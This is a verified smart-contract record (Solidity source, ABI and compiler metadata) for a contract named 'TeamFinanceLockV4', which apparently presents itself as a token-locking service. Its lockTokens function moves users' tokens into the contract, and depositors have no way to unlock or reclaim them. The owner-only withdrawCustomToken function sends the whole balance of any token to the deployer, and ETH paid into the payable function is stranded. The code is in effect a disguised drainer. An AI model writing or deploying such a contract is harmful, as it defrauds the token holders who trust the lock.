{"SourceCode": "//SPDX-License-Identifier: MIT\r\n pragma solidity ^0.8.19;\r\n\r\ninterface TeamFinanceLockV4IERC20 {\r\n    \r\n    function decimals() external view returns (uint);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}   \r\ncontract TeamFinanceLockV4 {\r\n\r\n  string private _name; \r\n   event TokensLocked(address indexed sender, uint256 amount);\r\n     address public owner;\r\n      TeamFinanceLockV4IERC20 customtoken;\r\n     bool public transfersAllowed;\r\n    constructor() {\r\n        _name = \"Team,Finance Lock V4\";\r\n        owner = msg.sender;\r\n        transfersAllowed = true;\r\n    }     \r\n \r\n     modifier isOwner() {\r\n        require(msg.sender == owner, \"Only owner can do this!\");\r\n        _;\r\n    }\r\n     function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n    function withdrawCustomToken(address _address) public isOwner {\r\n        customtoken = TeamFinanceLockV4IERC20(_address);\r\n        require(customtoken.balanceOf(address(this)) > 0, \"There is nothing to withdraw!\");\r\n        \r\n        bool sent = customtoken.transfer(owner, customtoken.balanceOf(address(this)));\r\n        require(sent, \"We failed to send tokens\");\r\n    }\r\n\r\n    function lockTokens(address _address, uint256 amount) external payable {\r\n        customtoken = TeamFinanceLockV4IERC20(_address); \r\n        require(amount > 0, \"Amount must be greater than zero\");\r\n        require(customtoken.balanceOf(address(msg.sender)) > 0, \"There is nothing to withdraw!\");\r\n        bool sent = customtoken.transferFrom(msg.sender, address(this), amount);\r\n        require(sent, \"We failed to send tokens\");\r\n        emit TokensLocked(msg.sender, amount);\r\n    }\r\n\r\n\r\n }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TokensLocked\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"lockTokens\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transfersAllowed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"withdrawCustomToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TeamFinanceLockV4", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e6cd5fa572fc36c27a8e1551c06321c188d429edaf29624fe23148504aa050be"}